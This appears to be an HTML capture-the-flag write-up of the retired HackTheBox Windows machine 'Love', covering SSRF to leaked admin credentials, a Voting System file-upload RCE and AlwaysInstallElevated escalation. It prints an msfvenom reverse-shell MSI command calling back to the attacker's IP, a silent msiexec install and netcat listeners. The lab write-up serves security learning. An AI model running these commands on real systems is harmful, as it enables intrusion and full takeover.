@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Love &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Love</h1>
+    <div class="meta">Target: <code>10.10.14.92</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">SSRF</span><span class="tag">VotingSystem</span><span class="tag">CVE</span><span class="tag">FileUpload</span><span class="tag">RCE</span><span class="tag">AlwaysInstallElevated</span><span class="tag">msfvenom</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#ssrf-internal-credentials">SSRF → Internal Credentials</a><a class="lvl3" href="#voting-system-1-0-authenticated-file-upload-rce">Voting System 1.0, Authenticated File Upload RCE</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#alwaysinstallelevated">AlwaysInstallElevated</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Love is an easy Windows box that opens with <strong>SSRF</strong>. A staging site lets me fetch arbitrary URLs server-side, which I use to read an internal-only service that leaks admin credentials. Those log into a Voting System app vulnerable to authenticated file-upload RCE, and root is the <strong>AlwaysInstallElevated</strong> misconfiguration, an MSI installed as SYSTEM.</p>
+<h2 id="recon">Recon</h2>
+<p>The HTTPS certificate leaked names and a vhost:</p>
+<pre><code>roy@love.htb, love.htb, ValentineCorp, staging.love.htb
+</code></pre>
+<p><code>staging.love.htb</code> hosts a different site with a "scan a URL" feature.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="ssrf-internal-credentials">SSRF → Internal Credentials</h3>
+<p>The staging site fetches whatever URL you give it, server-side.</p>
+<blockquote>
+<p><strong>Why that's SSRF:</strong> the server makes the request, not your browser. So it can reach services bound to localhost or internal ports that you can't hit directly. Pointing it at the box's own internal port surfaces an admin dashboard meant to be private.</p>
+</blockquote>
+<p>Aiming it at the internal service on port 5000 returned a password dashboard exposing the voting app's admin credentials:</p>
+<pre><code>Vote Admin Creds  -&gt;  admin : ‹redacted›
+</code></pre>
+<h3 id="voting-system-1-0-authenticated-file-upload-rce">Voting System 1.0, Authenticated File Upload RCE</h3>
+<p>Those creds logged into <code>http://love.htb/admin</code>. Voting System 1.0 has an <a href="https://www.exploit-db.com/exploits/49445">authenticated upload RCE</a>, it accepts a PHP file disguised as a voter image and serves it back executable. I set my IP/creds in the script and ran it:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 53
+C:\xampp\htdocs\omrs\images&gt;whoami
+love\phoebe
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="alwaysinstallelevated">AlwaysInstallElevated</h3>
+<p>WinPEAS flagged <strong>AlwaysInstallElevated</strong> enabled.</p>
+<blockquote>
+<p><strong>What it is:</strong> two registry policies (HKLM + HKCU) that, when both set, tell Windows Installer to run <em>any</em> MSI with SYSTEM privileges, even when launched by a normal user. It exists for deployment convenience and is a straight path to SYSTEM. I just need a malicious MSI.</p>
+</blockquote>
+<pre><code class="language-sh">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.92 LPORT=443 -f msi &gt; rev.msi
+</code></pre>
+<pre><code class="language-cmd">msiexec /quiet /qn /i rev.msi
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 443
+C:\WINDOWS\system32&gt;whoami
+nt authority\system
+</code></pre>
+<h2 id="root">Root</h2>
+<p>Box rooted.</p>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Certificates leak infrastructure</strong>, the <code>staging.</code> vhost came straight off the TLS cert.</li>
+<li><strong>SSRF reaches what you can't.</strong> A server-side fetch to <code>localhost:5000</code> exposed credentials bound to an internal-only dashboard.</li>
+<li><strong>AlwaysInstallElevated is a free SYSTEM</strong> when both registry keys are set, generate an MSI and <code>msiexec</code> it.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
